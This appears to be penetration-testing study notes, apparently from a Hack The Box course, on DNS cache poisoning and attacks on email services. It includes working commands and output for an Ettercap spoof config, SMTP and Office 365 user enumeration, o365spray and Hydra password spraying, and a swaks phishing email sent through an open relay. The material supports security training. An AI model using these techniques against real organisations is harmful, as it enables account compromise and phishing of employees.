DNS spoofing is also referred to as DNS Cache Poisoning. This attack involves alerting legitimate DNS records with false information so that they can be used to redirect online traffic to a fraudulent website. Example attack paths for the DNS Cache Poisoning are as follows:

-   An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (`MITM`) attack.
-   Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.

#### Local DNS Cache Poisoning

From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/).

To exploit the DNS cache poisoning via `Ettercap`, we should first edit the `/etc/ettercap/etter.dns` file to map the target domain name (e.g., `inlanefreight.com`) that they want to spoof and the attacker's IP address (e.g., `192.168.225.110`) that they want to redirect a user to:

Local DNS Cache Poisoning

```shell-session
# cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

# Subdomain Takeover is bad.

# Attacking Email Service

SMTP - Simple Mail Transfer Protocol

POP3 - Servers usually remove the email from the server. This can be changed.

IMAP4 - Leave messages on the server.

# Enumeration

We identify the Mail Exchanger by looking at the MX record on the DNS server.  We can use host or dig to query information about MX records.

```shell-session
$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```



```shell-session
$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

```shell-session
$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```

```shell-session
$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

A custom mail server might have the following ports open:

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Port</strong></th>
<th><strong>Service</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TCP/25</code></td>
<td>SMTP Unencrypted</td>
</tr>
<tr>
<td><code>TCP/143</code></td>
<td>IMAP4 Unencrypted</td>
</tr>
<tr>
<td><code>TCP/110</code></td>
<td>POP3 Unencrypted</td>
</tr>
<tr>
<td><code>TCP/465</code></td>
<td>SMTP Encrypted</td>
</tr>
<tr>
<td><code>TCP/993</code></td>
<td>IMAP4 Encrypted</td>
</tr>
<tr>
<td><code>TCP/995</code></td>
<td>POP3 Encrypted</td>
</tr>
</tbody>
</table>

Take a closer look:
```shell-session
$ sudo nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)
```

## Misconfigurations

#### Authentication

The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work:

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

```shell-session
$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."
```shell-session
$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
```shell-session
$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.

```shell-session
$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

## Cloud Enumeration

Office 365 example.

[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Let's first validate if our target domain is using Office 365.

```shell-session
$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

```shell-session
 $ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

## Password Attacks

### Hydra - Password Attack

```shell-session
$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.

```shell-session
$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```

## Protocol Specifics Attacks

An open relay is a Simple Transfer Mail Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

Scan for open relay:
```shell-session
# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Phish with open relay:
```shell-session
# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

I found [this](https://www.suburbancomputer.com/tips_email.htm) page of commands useful.

https://www.openwall.com/lists/oss-security/2020/01/28/3

There are other ways to attack email services that can be very effective as well. A few Hack The Box boxes demonstrate email attacks, such as [Rabbit](https://www.youtube.com/watch?v=5nnJq_IWJog), which deals with brute-forcing Outlook Web Access (OWA) and then sending a document with a malicious macro to phish a user, [SneakyMailer](https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html) which has elements of phishing and enumerating a user's inbox using Netcat and an IMAP client, and [Reel](https://0xdf.gitlab.io/2018/11/10/htb-reel.html) which dealt with brute-forcing SMTP users and phishing with a malicious RTF file.